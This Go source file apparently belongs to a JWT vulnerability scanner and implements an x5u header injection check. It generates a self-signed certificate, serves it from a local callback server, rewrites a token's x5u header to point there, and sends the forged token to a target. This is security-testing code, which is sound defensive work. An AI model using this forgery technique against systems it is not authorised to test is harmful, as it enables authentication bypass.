package x5uinjection

import (
	"context"
	_ "embed"

	"github.com/cerberauth/harnessx"
	"github.com/cerberauth/harnessx/checkdef"
	jwtpkg "github.com/cerberauth/jwtop/jwt"
	"github.com/cerberauth/jwtop/jwt/crack/checkbase"
	"github.com/cerberauth/jwtop/jwt/exploit"
)

//go:embed check.yaml
var checkYAML []byte

var Def = checkdef.MustParseCheckDefYAML("x5u_injection", checkYAML)

var Check = checkdef.NewCheck(Def, run, checkdef.WithSkip(harnessx.SkipWhen(skip)))

func skip(_ context.Context, target harnessx.Target, _ harnessx.ResultStore) string {
	pctx := target.Data.(*checkbase.ProbeCtx)
	if pctx.Offline {
		return "requires live server (server-side x5u fetch)"
	}
	if !pctx.IsAsymmetric {
		return "x5u injection not applicable for " + pctx.Alg
	}
	if pctx.X5UServerAddr == "" {
		return "no X5U callback address configured (set X5UServerAddr)"
	}
	return ""
}

// run generates a self-signed key and certificate, spins up a local cert
// server advertising it, points the token's x5u header at that server, and
// probes the target. The server is closed once the probe request has
// completed.
func run(ctx context.Context, target harnessx.Target, store harnessx.ResultStore) (harnessx.Result, error) {
	pctx := target.Data.(*checkbase.ProbeCtx)

	method, err := jwtpkg.ParseSigningMethod(pctx.Alg)
	if err != nil {
		return checkbase.SendToken(ctx, target, store, "", err)
	}

	token, srv, err := exploit.X5UInjectionWithLocalServer(pctx.TokenString, method, pctx.X5UServerAddr)
	if err != nil {
		return checkbase.SendToken(ctx, target, store, "", err)
	}
	defer srv.Close() //nolint:errcheck

	return checkbase.SendToken(ctx, target, store, token, nil)
}
